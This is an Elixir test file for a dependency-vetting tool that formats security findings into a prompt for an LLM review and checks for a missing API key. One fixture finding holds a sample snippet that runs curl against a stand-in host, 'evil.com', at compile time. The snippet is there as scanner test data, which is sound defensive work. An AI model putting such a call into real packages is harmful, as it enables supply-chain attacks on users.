defmodule VetCore.LLMReviewTest do
  use ExUnit.Case

  alias VetCore.LLMReview
  alias VetCore.Types.{Dependency, DependencyReport, Finding}

  defp sample_dep_report do
    %DependencyReport{
      dependency: %Dependency{
        name: :suspect_pkg,
        version: "0.2.1",
        source: :hex
      },
      findings: [
        %Finding{
          dep_name: :suspect_pkg,
          file_path: "/project/deps/suspect_pkg/lib/evil.ex",
          line: 10,
          check_id: :system_exec,
          category: :system_exec,
          severity: :critical,
          compile_time?: true,
          description: "System.cmd in module body",
          snippet: "System.cmd(\"curl\", [\"http://evil.com\"])"
        },
        %Finding{
          dep_name: :suspect_pkg,
          file_path: "/project/deps/suspect_pkg/lib/sneaky.ex",
          line: 5,
          check_id: :env_access,
          category: :env_access,
          severity: :warning,
          compile_time?: false,
          description: "System.get_env access"
        }
      ],
      risk_score: 75,
      risk_level: :high
    }
  end

  defp clean_dep_report do
    %DependencyReport{
      dependency: %Dependency{
        name: :clean_pkg,
        version: "1.0.0",
        source: :hex
      },
      findings: [],
      risk_score: 0,
      risk_level: :low
    }
  end

  describe "format_prompt/1" do
    test "produces a well-structured prompt with package info" do
      prompt = LLMReview.format_prompt(sample_dep_report())

      assert prompt =~ "suspect_pkg"
      assert prompt =~ "0.2.1"
      assert prompt =~ "hex.pm"
    end

    test "includes findings in the prompt" do
      prompt = LLMReview.format_prompt(sample_dep_report())

      assert prompt =~ "System.cmd in module body"
      assert prompt =~ "System.get_env access"
      assert prompt =~ "COMPILE-TIME"
      assert prompt =~ "critical"
    end

    test "includes the four review questions" do
      prompt = LLMReview.format_prompt(sample_dep_report())

      assert prompt =~ "false positives"
      assert prompt =~ "additional security concerns"
      assert prompt =~ "overall risk assessment"
      assert prompt =~ "Recommended actions"
    end

    test "handles dependency with no findings (baseline)" do
      prompt = LLMReview.format_prompt(clean_dep_report())

      # Should still produce a valid prompt, just with "(none)" for findings
      assert prompt =~ "clean_pkg"
      assert prompt =~ "(none)"
    end

    test "handles git source" do
      report = %DependencyReport{
        dependency: %Dependency{
          name: :git_pkg,
          version: "0.1.0",
          source: {:git, "https://github.com/example/repo.git"}
        },
        findings: [],
        risk_score: 10,
        risk_level: :low
      }

      prompt = LLMReview.format_prompt(report)
      assert prompt =~ "git: https://github.com/example/repo.git"
    end
  end

  describe "review/2" do
    test "returns error when API key is missing" do
      # Ensure env var is not set for this test
      original = System.get_env("ANTHROPIC_API_KEY")
      System.delete_env("ANTHROPIC_API_KEY")

      result = LLMReview.review(sample_dep_report(), api_key: nil)
      assert result == {:error, :missing_api_key}

      # Restore
      if original, do: System.put_env("ANTHROPIC_API_KEY", original)
    end

    test "returns error with empty string API key" do
      result = LLMReview.review(sample_dep_report(), api_key: "")
      assert result == {:error, :missing_api_key}
    end
  end
end
